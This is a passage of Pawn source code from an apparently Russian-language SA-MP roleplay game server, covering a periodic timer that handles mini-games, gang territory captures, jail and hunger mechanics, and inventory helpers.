	{
		if(StartTimeGG > 1)
		{
		    StartTimeGG--;
			if(StartTimeGG == 120) SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}Регистрация на 'GunGame'. Начало через 2 минуты.");
		}
		else if(StartTimeGG == 1) StartGG(),StartTimeGG = 0;
	}
	if(DogGame)
	{
	    if(DogTime < gettime())
	    {
	        DogGame = 0;
	        DestroyDynamic3DTextLabel(DogText);
	        for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !GetPVarInt(i,"InDog")) continue;
				if(DogVed == i) SendClientMessage(i,CREWARD,"Вы проиграли!");
				else SendClientMessage(i,CREWARD,"Вы выиграли!"),GiveMoney(i,250);
				SetSkin(i);
				SetPlayerPos(i,2184.1785+random(2),1114.7395+random(2),12.6484);
			    SetPlayerFacingAngle(i,58.7433);
			    SetPlayerInterior(i,0);
			    SetPlayerVirtualWorld(i,0);
			}
			DogVed = INVALID_PLAYER_ID;
			DogVedPred = INVALID_PLAYER_ID;
			DogMap = random(4);
	    }
	}
	if(InGameGG)
	{
	    if(check_gg < gettime())
	    {
    		InGameGG = 0;
			SendClientMessageToAll(CREWARD,"[Новости] {FFFFFF}'GunGame' закончился. Подробнее: /gglist.");

		 	new value_score,
		 	value_level,
			value_id,
			skip;
			for(new i; i < 9; i++)
			{
			    value_score = 0;
			    value_id = i;
			    for(new j = 0; j < MAX_PLAYERS; j++)
			    {
			        if(!IsPlayerConnected(j) || !GetPVarInt(j, "KomGG")) continue;
			        //printf("[1] ID: %d",j);
			        for(new t; t <  KolvIgGG; t++)
			        {
			           // printf("[2] ID: %d %d %d",j,InfoGG[t][gKills],GetPVarInt(j, "KillGG"));
			            if(InfoGG[t][gKills] != GetPVarInt(j, "KillGG")) continue;
			            skip = 1;
			            break;
			        }
			        if(skip)
			        {
			           // printf("[3] ID: %d",j);
			            skip = 0;
			            continue;
			        }
			        if(value_score < GetPVarInt(j, "KillGG"))
			        {
			          //  printf("[4] ID: %d %d %d",value_score,GetPVarInt(j, "KillGG"));
			            value_score = GetPVarInt(j, "KillGG");
			            value_level = GetPVarInt(j, "Level");
			            value_id = j;
			          //  printf("[5]  %d %d %d",value_score,value_level,value_id);
			        }
			    }
			    if(!GetPVarInt(value_id, "KomGG")) continue;
			    format(InfoGG[i][gName],24,PlayerInfo[value_id][pSendername]);
			    if(i < 2)
			    {
			        GiveMoney(value_id,250);
			        SendClientMessage(value_id,0xDC3A32FF,"Вы выиграли в мероприятии GunGame");
			    }
			    InfoGG[i][gLevel] = value_level;
				InfoGG[i][gKills] = value_score;
				DeletePVar(value_id,"KillGG");
				DeletePVar(value_id,"Level");
				DeletePVar(value_id,"KomGG");
				if(IsValidDynamicArea(GetPVarInt(value_id,"AreaSK"))) DestroyDynamicArea(GetPVarInt(value_id,"AreaSK")),DeletePVar(value_id,"AreaSK");
				DeletePVar(value_id,"AntiSK");
				SetSkin(value_id);
				ResetPlayerWeapons(value_id);
				SetPlayerPos(value_id,1633.4722,971.8034,10.8203);
			    SetPlayerFacingAngle(value_id,265.9857);
			    SetPlayerInterior(value_id,0);
			    SetPlayerVirtualWorld(value_id,0);
				printf("Игрок %s [ID: %d] на %d месте с %d фрагов", InfoGG[i][gName], value_id, i, value_score);
			}
	    }
	}
	for(new i = 0; i < 10; i++)
	{
	    if(!ZoneBattle[i][btimebattle]) continue;
	    if(ZoneBattle[i][btimebattle] > 1) ZoneBattle[i][btimebattle]--;
		else if(ZoneBattle[i][btimebattle] == 1)
		{
		    ZoneBattle[i][btimebattle] = 0;
			if(GetPVarInt(ZoneBattle[i][bplayer1],"LowRide") > GetPVarInt(ZoneBattle[i][bplayer2],"LowRide"))
			{
			    SendClientMessage(ZoneBattle[i][bplayer2],CREWARD,"Вы проиграли!");
                SendClientMessage(ZoneBattle[i][bplayer1],CREWARD,"Вы выиграли!");
                GiveMoney(ZoneBattle[i][bplayer1],ZoneBattle[i][bstavka]*2);
			}
			else
			{
			    SendClientMessage(ZoneBattle[i][bplayer1],CREWARD,"Вы проиграли!");
                SendClientMessage(ZoneBattle[i][bplayer2],CREWARD,"Вы выиграли!");
                GiveMoney(ZoneBattle[i][bplayer2],ZoneBattle[i][bstavka]*2);
			}
		    StopLowRide(ZoneBattle[i][bplayer2]);
		    StopLowRide(ZoneBattle[i][bplayer1]);
		}
	}
	for(new i = 1; i <= 4; i++)
	{
	    if(StolInfo[i][sJdet] > 1)
	    {
	        StolInfo[i][sJdet]--;
	        UpdateStol(i);
	    }
	    else if(StolInfo[i][sJdet] == 1)
	    {
            StolInfo[i][sJdet] = 0;
            StolInfo[i][sIgra] = 30;
            new kek = 0;
            for(new i1 = 0; i1 <= 3; i1++) if(StolInfo[i][sPlayer][i1] != -1) kek++;
            StolInfo[i][sBet] = StolInfo[i][sPrice]*kek;
			UpdateStol(i);
	    }
	    if(StolInfo[i][sIgra] > 1)
	    {
	        StolInfo[i][sIgra]--;
	        UpdateStol(i);
	    }
	    else if(StolInfo[i][sIgra] == 1)
	    {
	        StolInfo[i][sIgra] = 0;
	        new pobed = 0,pobedid = -1,nihuya = 0,heh = 0;
            for(new i1 = 0; i1 <= 3; i1++)
            {
                heh++;
                if(StolInfo[i][sDice][i1] > pobed || StolInfo[i][sDice][i1] == pobed && StolInfo[i][sDice][i1] == 0 )
                {
                    pobed = StolInfo[i][sDice][i1];
                    pobedid = i1;
                }
                else if(StolInfo[i][sDice][i1] == pobed) nihuya++;
            }
            UpdateStol(i);
            if(nihuya > 0)
            {
				for(new i1 = 0; i1 < MAX_PLAYERS; i1++)
				{
			    	if(!IsPlayerConnected(i1) || PlayerLogged[i1] == false) continue;
		   			if(GetPVarInt(i1,"Stol") == i)
		   			{
		   			    StolInfo[GetPVarInt(i1,"Stol")][sPlayer][GetPVarInt(i1,"StolID")] = -1;
		   			    StolInfo[GetPVarInt(i1,"Stol")][sDice][GetPVarInt(i1,"StolID")] = 0;
		   			    for(new x = 0; x < 3; x++) TextDrawHideForPlayer(i1,CasinoTD[GetPVarInt(i1,"Stol")][x]);
			  			for(new x = 0; x < 21; x++) TextDrawHideForPlayer(i1,Casino[x]);

						CancelSelectTextDraw(i1);
						TogglePlayerControllable(i1, 1);
						GiveMoney(i1,GetPVarInt(i1,"StolCena"));
						DeletePVar(i1,"Stol");
						DeletePVar(i1,"StolID");
						DeletePVar(i1,"StolCena");
		   			}
				}
            }
            else
            {
				for(new i1 = 0; i1 < MAX_PLAYERS; i1++)
				{
			    	if(!IsPlayerConnected(i1) || PlayerLogged[i1] == false) continue;
		   			if(GetPVarInt(i1,"Stol") == i)
		   			{
		   			    StolInfo[GetPVarInt(i1,"Stol")][sPlayer][GetPVarInt(i1,"StolID")] = -1;
		   			    StolInfo[GetPVarInt(i1,"Stol")][sDice][GetPVarInt(i1,"StolID")] = 0;
						for(new x = 0; x < 3; x++) TextDrawHideForPlayer(i1,CasinoTD[GetPVarInt(i1,"Stol")][x]);
			  			for(new x = 0; x < 21; x++) TextDrawHideForPlayer(i1,Casino[x]);
						CancelSelectTextDraw(i1);
						TogglePlayerControllable(i1, 1);
						if(GetPVarInt(i1,"StolID") == pobedid) GiveMoney(i1,StolInfo[i][sBet]);
						DeletePVar(i1,"Stol");
						DeletePVar(i1,"StolID");
						DeletePVar(i1,"StolCena");
		   			}
				}
				StolInfo[i][sBet] = 0;
            }
	    }
	    
	}
	if((hour == 13 && minut == 20 ||hour == 18 && minut == 10 ||hour == 21 && minut == 30) && sec == 00  )
	{
		SendDMes("[D] Оружие от государства будет доставлено через 10 минут на станцию дозаправки в пустыне.");
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
			if(IsAGang(i)) SendClientMessage(i,CGREEN,"Информатор: Оружие от государства будет доставлено через 10 минут на станцию дозаправки в пустыне.");
		}
//		samolet = 40000;
	}
	
	if((hour == 13 && minut == 20 ||hour == 18 && minut == 20 ||hour == 21 && minut == 20) && sec == 00  )
	{
	    SetPlayerVirtualWorld(npcid,0);
	    SetVehicleVirtualWorld(vehnpc,0);
		PutPlayerInVehicle(npcid, vehnpc, 0);
		for(new i = 0; i <= 1; i++)
		{
			if(IsValidDynamic3DTextLabel(sam[i])) DestroyDynamic3DTextLabel(sam[i]);
	  		if(IsValidDynamicObject(objectsam[i])) DestroyDynamicObject(objectsam[i]);
	  		samolet[i]= 0;
  		}
		mat = 1;
	}
	static const fmt_string3[] = "__TIMER: ~b~~h~~h~~h~%s__";
	new str3[sizeof(fmt_string3)+10];
	for(new i = 1; i <= TOTALBIZ; i++)
	{
		if(BizInfo[i][bWarTime] > 0)
		{
			BizInfo[i][bWarTime]--;
			new stringText[10];
			Convert(BizInfo[i][bWarTime], stringText);
			
			for(new x = 0; x < MAX_PLAYERS; x++)
			{
				if(!IsPlayerConnected(x) || PlayerLogged[x] == false) continue;
				if(PlayerInfo[x][pMember] != BizInfo[i][bNapad] && PlayerInfo[x][pMember] != BizInfo[i][bMafia]) continue;
				format(str3,sizeof(str3),fmt_string3,stringText);
				PlayerTextDrawSetString(x,CaptPl[x][1],str3);
			}
		}
		else
		{
		    if(ZoneBat[i] > 0)
		    {
		        new frak = BizInfo[i][bMafia];
		        new bizfrac = BizInfo[i][bMafia]-6;
	 			new biznapad = BizInfo[i][bNapad]-6;
				if(CaptInfo[biznapad][score] > CaptInfo[bizfrac][score])
				{
					SendFMes(BizInfo[i][bNapad],COLOR_SKLAD,"[F] Вы завоевали новую территорию");
					SendFMes(BizInfo[i][bMafia],COLOR_SKLAD,"[F] Вы не смогли удержать территорию");
					BizInfo[i][bMafia] = BizInfo[i][bNapad];
                    UpdateMat(BizInfo[i][bNapad]);
				}
				else if(CaptInfo[biznapad][score] < CaptInfo[bizfrac][score])
				{

					SendFMes(BizInfo[i][bNapad],COLOR_SKLAD,"[F] Вы не смогли завоевать территорию");
					SendFMes(BizInfo[i][bMafia],COLOR_SKLAD,"[F] Вам удалось удержать территорию");
				}
				CaptureEnd(BizInfo[i][bNapad], frak);
				BizInfo[i][bWar] = 0;
				CaptInfo[biznapad][terid] = 0;
				CaptInfo[biznapad][capture] = 0;
				CaptInfo[biznapad][score] = 0;
				new bizfracs = frak-6;
				CaptInfo[bizfracs][terid] = 0;
				CaptInfo[bizfracs][capture] = 0;
				CaptInfo[bizfracs][score] = 0;
				CaptInfo[biznapad][gangnumber] = 0;
				CaptInfo[bizfracs][gangnumber] = 0;
				BizInfo[i][bNapad] = 0;
				UpdateBiz(i);

		    }
		}
	}
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(GZSafeTime[i] > 0)
		{
			GZSafeTime[i]--;
			new stringText[10];
			Convert(GZSafeTime[i], stringText);
			
			for(new x = 0; x < MAX_PLAYERS; x++)
			{
				if(!IsPlayerConnected(x) || PlayerLogged[x] == false) continue;
				if(PlayerInfo[x][pMember] != GZInfo[i][gNapad] && PlayerInfo[x][pMember] != GZInfo[i][gFrak]) continue;
				format(str3,sizeof(str3),fmt_string3,stringText);
				PlayerTextDrawSetString(x,CaptPl[x][1],str3);
			}
		}
		else
		{
		    if(ZoneBat[i] > 0)
		    {
		        new frak = GZInfo[i][gFrak];
		        new napad = GZInfo[i][gNapad]-6;
		        new gzfrac = GZInfo[i][gFrak]-6;
				if(CaptInfo[napad][score] == CaptInfo[gzfrac][score])
				{
					new kek = 0,kok  = 0;
					foreach(new i1:Player)
					{
                        if(!IsPlayerConnected(i1) || PlayerLogged[i1] == false) continue;
						if(!PlayerToKvadrat(i1,GZInfo[i][gCoords][0], GZInfo[i][gCoords][1],GZInfo[i][gCoords][2],GZInfo[i][gCoords][3])) continue;
						if(PlayerInfo[i1][pMember] == GZInfo[i][gFrak]) kek++;
						if(PlayerInfo[i1][pMember] == GZInfo[i][gNapad]) kok++;
					}
					if(kok > kek)
					{

						SendFMes(GZInfo[i][gNapad],COLOR_SKLAD,"[F] Вы завоевали новую территорию");
						SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,"[F] Вы не смогли удержать территорию");
						GZInfo[i][gFrak] = GZInfo[i][gNapad];
					}
					if(kek > kok)
					{


						SendFMes(GZInfo[i][gNapad],COLOR_SKLAD,"[F] Вы не смогли завоевать территорию");
						SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,"[F] Вам удалось удержать территорию");
					}
					if(kek == kok)
					{

						SendFMes(GZInfo[i][gNapad],COLOR_SKLAD,"[F] Вы не смогли завоевать территорию");
						SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,"[F] Вам удалось удержать территорию");
					}
				}
				else if(CaptInfo[napad][score] > CaptInfo[gzfrac][score])
				{
					SendFMes(GZInfo[i][gNapad],COLOR_SKLAD,"[F] Вы завоевали новую территорию");
					SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,"[F] Вы не смогли удержать территорию");
					GZInfo[i][gFrak] = GZInfo[i][gNapad];
                    UpdateMat(GZInfo[i][gNapad]);
				}
				else if(CaptInfo[napad][score] < CaptInfo[gzfrac][score])
				{

					SendFMes(GZInfo[i][gNapad],COLOR_SKLAD,"[F] Вы не смогли завоевать территорию");
					SendFMes(GZInfo[i][gFrak],COLOR_SKLAD,"[F] Вам удалось удержать территорию");
				}
				CaptureEnd(GZInfo[i][gNapad], frak);
				ZoneBat[i] = 0;
				GZInfo[i][gCapture] = 0;
				GangZoneStopFlashForAll(i);
				CaptInfo[napad][terid] = 0;
				CaptInfo[napad][capture] = 0;
				CaptInfo[napad][score] = 0;
				new fracs = frak-6;
				CaptInfo[fracs][terid] = 0;
				CaptInfo[fracs][capture] = 0;
				CaptInfo[fracs][score] = 0;
				CaptInfo[napad][gangnumber] = 0;
				CaptInfo[fracs][gangnumber] = 0;
				GZInfo[i][gNapad] = 0;
				GZInfo[i][gCapture] = 0;
				GangZoneStopFlashForAll(i);
				GangZoneHideForAll(i);
				GangZoneShowForAll(GZInfo[i][id],GetGangZoneColor(GZInfo[i][gFrak]));
				SaveGZ(i);

		    }
		}
	}

	if(hour > 9 && hour < 21)
	{
		if(saveacc != 0 && saveacc < GetTickCount())
		{
			saveacc = GetTickCount()+600000;
			SendAdminMessage(CGREY,"[A] Аккаунты успешно сохранены");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
			    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
				SaveAccount(i);
			}
		}
	}
	if(koleso < gettime())
	{
	    new krek = 0;
		for(new i = 0; i < MAX_VEHICLES; i++)
		{
			if(random(4) != 2) continue;
			for(new i1 = 0; i1 < MAX_PLAYERS; i1++)
			{
			    if(!IsPlayerConnected(i1) || PlayerLogged[i1] == false || GetPVarInt(i1,"InDrift")) continue;
				if(GetPlayerVehicleID(i1) == i && GetPlayerState(i1) == 2) krek++;
				break;
			}
			if(krek > 0)
			{
            	new panels, doors1, lights1, tires;
				GetVehicleDamageStatus(i, panels, doors1, lights1, tires);
				UpdateVehicleDamageStatus(i, panels, doors1, lights1, random(2)+1);
				break;
			}
			
		}
		new kek = 2400 + random(1200);
    	koleso = gettime()+kek;
	}
	new days,mon,yer;
 	getdate(yer,mon,days);
	if(DayCheck != days)
	{
	    for(new i = 1; i <= TOTALKOM; i++)
	    {
	        if(KomInfo[i][kOplata] < gettime())
	        {
	            strmid(KomInfo[i][kOwner], "None", 0, strlen("None"), 32);
	            KomInfo[i][kOplata] = 0;
	            query = "";
	            format(query, sizeof(query), "UPDATE komnata SET owner = 'None',oplata = 0 WHERE id = '%d' LIMIT 1",i);
				mysql_tquery(mysql,query);
	        }
	    }
	    DayCheck = days;
		//CheckIp();
	}
	static const fmt_string4[] = "Вы взяли %d материалов";
	new str4[sizeof(fmt_string4)+2];
	new str[110];
	new band;
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
	    UpdatePlayerRadar(i);
	    OnPlayerPickupExit(i);
	    band = PlayerInfo[i][pGrabTeam];
		if(band)
		{
			if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 4)
			{
				if(BankGrab[band][bTickBomb] > 1)
				{
		            BankGrab[band][bTickBomb]--;
		            for(new g = 0; g < MAX_PLAYERS; g++)
					{
					    if(!IsPlayerConnected(g) || PlayerLogged[g] == false || PlayerInfo[i][pGrabTeam] != band) continue;
					    format(str,sizeof(str),"~r~%d",BankGrab[band][bTickBomb]);
					    GameTextForPlayer(i,str,500,6);
					}
				}
				else if(BankGrab[band][bTickBomb] == 1)
				{
					CreateExplosion(1385.467529, 0.895255, 999.899291, 7, 10.0);
					DestroyDynamicObject(BankHack[0][bankDoor][4]);
					DestroyDynamicObject(BankHack[0][bankDoor][3]);
					SendBandMes(band,CREWARD,"Взламывайте ячейки и относите деньги в транспорт!");
					BankGrab[band][bGrabStatus] = 5;
				}
			}
		}
	    if(GetPVarInt(i,"CameraOn"))
		{
			
		    format(str,sizeof(str),"%d.%d.%d %d:%d",days,mon,yer,hour,minut);
		    PlayerTextDrawSetString(i,CameraP[0][i],str);
		}
	    if(GetPVarInt(i,"HealBed"))
		{
			SetPVarInt(i,"HealTime",GetPVarInt(i,"HealTime")+1);
		    if(GetPVarInt(i,"HealTime") >= (8+random(3)))
		    {
		        new Float:Health=PlayerInfo[i][pHeal];
		        if(GetPVarInt(i,"HealBed") > 8)
		        {
		            Health += 4.0;
              		GameTextForPlayer(i, "+4 HP", 0, 1);
		        }
		        else
		        {
		            Health += 2.0;
              		GameTextForPlayer(i, "+2 HP", 0, 1);
		        }
		        if(PlayerInfo[i][pHeal] >= 100.0)
				{
				    if(GetPVarInt(i,"HealBed") > 16) format(str,sizeof(str),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}%d${ffffff}\nИспользуйте: {f7ae11}H",KoykaCena);
				    else format(str,sizeof(str),"{f7ae11}[Койка]{ffffff}\nСтатус: {f7ae11}Свободна{ffffff}\nЦена: {f7ae11}Бесплатно{ffffff}\nИспользуйте: {f7ae11}H");
                    UpdateDynamic3DTextLabelText(KoykaText[GetPVarInt(i,"HealBed")-1],CWHITE,str);
				    StatusKoyka[GetPVarInt(i,"HealBed")-1] = false;
				    DeletePVar(i,"HealBed");
				    DeletePVar(i,"HealTime");
				    ClearAnim(i);
				    PlayerInfo[i][pNHeal] = 0;
				    SetPlayerHealth(i,100);
					TogglePlayerControllable(i,true);
					SendClientMessage(i,CREWARD,"Вы закончили свое лечение!");
	 			}
		    }
		}
	    if((IsPlayerInDynamicArea(i,armygunsp) || IsPlayerInDynamicArea(i,armylichsp[0])
		|| IsPlayerInDynamicArea(i,armylichsp[1])
		|| IsPlayerInDynamicArea(i,armylichsp[2])
		|| IsPlayerInDynamicArea(i,armylichsp[3])
		|| IsPlayerInDynamicArea(i,armylichsp[4]))
		 && !GetPVarInt(i,"AmmoVR") && (IsAGang(i) || IsAMafia(i)))
		{
			if(GetPVarInt(i,"AmmoTimer") < 25)
			{
			    if(FracMats[F_ARMY] < 500) return SendClientMessage(i,CGREY,"На складе недостаточно метриалов");
			    SetPVarInt(i,"AmmoTimer",GetPVarInt(i,"AmmoTimer")+1);
			    GameTextForPlayer(i, "~G~+10 MATERIALS WAIT....", 500, 1);
			}
			else
			{
				if(FracMats[F_ARMY] < 500) return SendClientMessage(i,CGREY,"На складе недостаточно материалов");
				if(IsPlayerInDynamicArea(i,armygunsp))
				{
				    FracMats[F_ARMY] -= 500;
					SetPVarInt(i,"AmmoVR",1);
					SetPlayerSpecialAction(i,25);
					SetPlayerAttachedObject(i, 1, 2358, 1, 0.121000, 0.364999, 0.000000, 0.000000, 87.699951, 0.000000, 1.000000, 1.00, 1.000000);
					SendClientMessage(i,CREWARD,"Вы взяли ящик с материалами | Положить в транспорт: /put | Выбросить: /drop");
					UpdateArmy();
				}
				else
				{
				    new krek = (!PlayerInfo[i][pUl][2]) ? (500) : (1000) - PlayerInfo[i][pMats];
				 	if(krek)
					{
					    DeletePVar(i,"AmmoTimer");
		  		 		return SendClientMessage(i,CGREY,"Вы не можете с собой носить больше материалов");
					}
					FracMats[F_ARMY] -= krek;
					PlayerInfo[i][pMats] += krek;
					GiveInv(i,447,krek);
					format(str4,sizeof(str4),fmt_string4,krek);
				    SendClientMessage(i,CREWARD,str4);
				    UpdateArmy();
				}

				DeletePVar(i,"AmmoTimer");
			}
		}
	    if(GetPVarInt(i,"LicTest") > 0 && GetPlayerVehicleID(i) != GetPVarInt(i,"LicCar"))
		{
			if(GetPVarInt(i,"LicMag") > 1) SetPVarInt(i,"LicMag",GetPVarInt(i,"LicMag")-1);
			else if(GetPVarInt(i,"LicMag") == 1)
			{
			    DeletePVar(i,"LicTest");
				DeletePVar(i,"LicTest1");
				DeletePVar(i,"Check");
				DeletePVar(i,"LicMag");
				SetVehicleToRespawn(GetPVarInt(i,"LicCar"));
				SendClientMessage(i,CREWARD,"Вы не вернулись в транспорт, экзамен провален");
				DeletePVar(i,"LicCar");
			}
		}
     	if(Trenag[i]==2 && kol[i]>=0)
		{
		    kol[i]--;
		    switch(kol[i])
		    {
		        case 0: { ApplyAnimation( i, "GYMNASIUM", "gym_bike_pedal", 4.1, 1, 0, 0, 1, 1 ); }
		        case 1: { ApplyAnimation( i, "GYMNASIUM", "gym_bike_slow", 4.1, 1, 0, 0, 1, 1 ); }
		        case 2: { ApplyAnimation( i, "GYMNASIUM", "gym_bike_fast", 4.1, 1, 0, 0, 1, 1 ); }
		        case 3: { ApplyAnimation( i, "GYMNASIUM", "gym_bike_faster", 4.1, 1, 0, 0, 1, 1 ); if(PlayerInfo[i][pVelo] < 40*PlayerInfo[i][pSkillT]) PlayerInfo[i][pVelo]++; }
		    }
		}
		if(Trenag[i]==4 && kol[i]>=0)
		{
		    kol[i]--;
		    switch(kol[i])
		    {
		        case 0: { ApplyAnimation( i, "GYMNASIUM", "gym_tread_walk", 4.1, 1, 0, 0, 1, 1 ); }
		        case 1: { ApplyAnimation( i, "GYMNASIUM", "gym_tread_jog", 4.1, 1, 0, 0, 1, 1 ); }
		        case 2: { ApplyAnimation( i, "GYMNASIUM", "gym_tread_sprint", 4.1, 1, 0, 0, 1, 1 ); if(PlayerInfo[i][pBeg] < 50*PlayerInfo[i][pSkillT]) PlayerInfo[i][pBeg]++; }
		    }
		}

		if(GetPVarInt(i,"AFK_Time") < 2)
		{
			if(GetPVarInt(i,"Sec") < 60) SetPVarInt(i,"Sec",GetPVarInt(i,"Sec")+1);
			else PlayerInfo[i][pMin]++,DeletePVar(i,"Sec");
			if(!PlayerInfo[i][pUl][0] && GetPVarInt(i,"Golod") < 300) SetPVarInt(i,"Golod",GetPVarInt(i,"Golod")+1);
			else if(PlayerInfo[i][pUl][0] && GetPVarInt(i,"Golod") < 600) SetPVarInt(i,"Golod",GetPVarInt(i,"Golod")+1);
			else
			{
				DeletePVar(i,"Golod");
				if(PlayerInfo[i][pGolod] > 10) SetGolod(i,PlayerInfo[i][pGolod]-1);
				else
				{
					SendClientMessage(i,CBLUE,"Внимание! Вы сильно проголодались, Вам надо срочно поесть иначе вы попадете в больницу");
					new Float:h;
					GetPlayerHealth(i,h);
					SetHealth(i,h-2);
					if(PlayerInfo[i][pGolod] > 3) SetGolod(i,PlayerInfo[i][pGolod]-1);
				}
			}
		}
		if(PlayerInfo[i][pWanted] > 0)
		{
			if(GetPVarInt(i,"Wanted") < 1200) SetPVarInt(i,"Wanted",GetPVarInt(i,"Wanted")+1);
			else
			{
				DeletePVar(i,"Wanted");
				PlayerInfo[i][pWanted] -= 1;
				SetPlayerWantedLevel(i,PlayerInfo[i][pWanted]);
				SendClientMessage(i,CBLUE,"Ваш уровень розыска снизился");
			}
		}
		if(GetPVarInt(i,"CameraC"))
		{
		    switch(GetPVarInt(i,"CameraC"))
		    {
		        case 5:
				{
				    PlayerTextDrawHide(i, pSatellite[i][4]);
				    PlayerTextDrawTextSize(i, pSatellite[i][4], 50.0000, 10.0000);
				    PlayerTextDrawShow(i, pSatellite[i][4]);
					PlayerTextDrawSetString(i,pSatellite[i][0],"~g~READY ~w~system startup...");
				}
		        case 4:
				{
				    PlayerTextDrawHide(i, pSatellite[i][4]);
				    PlayerTextDrawTextSize(i, pSatellite[i][4], 75.0000, 10.0000);
				    PlayerTextDrawShow(i, pSatellite[i][4]);
					PlayerTextDrawSetString(i,pSatellite[i][1],"~g~READY ~w~the connection to the cameras...");
				}
		        case 3:
				{
				    PlayerTextDrawHide(i, pSatellite[i][4]);
				    PlayerTextDrawTextSize(i, pSatellite[i][4], 125.0000, 10.0000);
				    PlayerTextDrawShow(i, pSatellite[i][4]);
					PlayerTextDrawSetString(i,pSatellite[i][2],"~g~READY ~w~connection check...");
				}
		        case 2:
				{
				    PlayerTextDrawHide(i, pSatellite[i][4]);
				    PlayerTextDrawTextSize(i, pSatellite[i][4], 200.0000, 10.0000);
				    PlayerTextDrawShow(i, pSatellite[i][4]);
					PlayerTextDrawSetString(i,pSatellite[i][3],"~g~READY ~w~loading the interface...");
				}
		        case 1:
		        {
		            DeletePVar(i,"CameraC");
		            for(new gSL; gSL < 9; gSL++) TextDrawHideForPlayer(i, gSatellite[gSL]);
					for(new pSL; pSL < 5; pSL++) PlayerTextDrawHide(i, pSatellite[i][pSL]);
		            //TogglePlayerControllable(i, 1);
		            SetCam(i);
		        }
			}
			SetPVarInt(i,"CameraC",GetPVarInt(i,"CameraC")-1);
		}
		if(GetPVarInt(i,"TimerDal") > 1)
		{
			SetPVarInt(i,"TimerDal",GetPVarInt(i,"TimerDal")-1);
			new strs[9];
		    format(strs,sizeof(strs),"~r~%d",GetPVarInt(i,"TimerDal"));
		    GameTextForPlayer(i,strs,500,6);
		}
		else if(GetPVarInt(i,"TimerDal") == 1)
		{
		    SendClientMessage(i,CREWARD,"Прицеп удален!");
			DestroyVehicle(Trailer[i]);
			Trailer[i] = -1;
			TrailerKol[i] = 0;
		    DeletePVar(i,"TimerDal");
	    }
	    if(GetPVarInt(i,"SekBus") > 1)
		{
		    new strs[9];
		    format(strs,sizeof(strs),"~r~%d",GetPVarInt(i,"SekBus"));
		    GameTextForPlayer(i,strs,500,6);
			SetPVarInt(i,"SekBus",GetPVarInt(i,"SekBus")-1);
		}
	    else if(GetPVarInt(i,"SekBus") == 1)
	    {
	        SendClientMessage(i,CREWARD,"Вы закончили работу. Зарплату вы получите во время PayDay.");
	        ClearJob(i);
	    }
		if(PlayerInfo[i][pMuted] > 1) PlayerInfo[i][pMuted]--;
		else if(PlayerInfo[i][pMuted] == 1)PlayerInfo[i][pMuted] = 0;
		if(PlayerInfo[i][pHMuted] > 1) PlayerInfo[i][pHMuted]--;
		else if(PlayerInfo[i][pHMuted] == 1) PlayerInfo[i][pHMuted] = 0;
		if(PlayerInfo[i][pJail] > 0)
		{
			if(PlayerInfo[i][pJailTime] > 0) PlayerInfo[i][pJailTime]--;
			else if(PlayerInfo[i][pJailTime] <= 0)
			{
			    SetPlayerPos(i,294.1084,1412.5465,10.0101);
			    SetPlayerFacingAngle(i,263.5977);
			    SetPlayerInterior(i, 0);
			    SetPlayerVirtualWorld(i, 0);
				SendClientMessage(i,CGREEN,"Вы отсидели свой срок заключения");
				PlayerInfo[i][pJailTime] = 0; PlayerInfo[i][pJail] = 0;
			}
		}
	}
	return 1;
}
stock IsAPlane(carid){switch(GetVehicleModel(carid)){case 592,577,511,512,593,425,520,553,476,519,460,513,548,417,487,488,497,563,447,469:return true;}return false;}
stock IsABoat(carid){switch(GetVehicleModel(carid)){case 472,473,493,595,484,430,452..454,446:return true;}return false;}
stock GetVehicleSpeed(const vehicleid)
{
    new Float:X, Float:Y, Float:Z, Float:SPEED;
    GetVehicleVelocity(vehicleid, X, Y, Z);
    SPEED = ( (floatsqroot( (X*X) + (Y*Y) )*10) / 1.65 ) * 30;
    return floatround(SPEED, floatround_round);
}
stock GetPlayerSpeed(const playerid)
{
    new Float:X, Float:Y, Float:Z, Float:SPEED;
    GetPlayerVelocity(playerid, X, Y, Z);
    SPEED = ( (floatsqroot( (X*X) + (Y*Y) )*10) / 1.65 ) * 30;
    return floatround(SPEED, floatround_round);
}
stock GetPlayerID(playername[])
{
    new playername2[MAX_PLAYER_NAME];
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
		
		GetPlayerName(i, playername2, sizeof(playername2));
		if(strcmp(playername2, playername, true, strlen(playername)) == 0) return i;
	}
	return INVALID_PLAYER_ID;
}


stock Inven(kek,playerid)
{
	new text[10];
	switch(PlayerInfo[playerid][pMask])
	{
		case 0: text = "Нет";
		case 1: text = "Есть";
	}
	new text1[10];
	switch(PlayerInfo[playerid][pKan])
	{
		case 0: text1 = "Нет";
		case 1: text1 = "Есть";
	}
	new str22[200];
	str22 = "";
	static const fmt_string[] = "\n%s (%d)";
	new str[sizeof(fmt_string)+32];
	new gunname[32];
	for(new i = 0; i <=5; i++)
	{
	    if(!GunInfo[playerid][pWeapon][i]) continue;
		GetWeaponName(GunInfo[playerid][pWeapon][i], gunname, sizeof(gunname));
		format(str, sizeof(str), fmt_string,gunname,GunInfo[playerid][pAmmo][i]);
		strcat(str22,str);
	}
	if(!strlen(str22)) str22 = "Нет";
	static const fmt_string2[] = "{FFFFFF}\tМатериалы:\t\t\t%i\n\tНаркотики:\t\t\t%i\n\tМаска:\t\t\t\t%s\n\tАптечки:\t\t\t%i\n\tКанистра:\t\t\t%s\n\tСигарет:\t\t\t%i\n\tОружие:\t\t\t%s";
	new str2[sizeof(fmt_string2)+3+3+3+3+3+3];
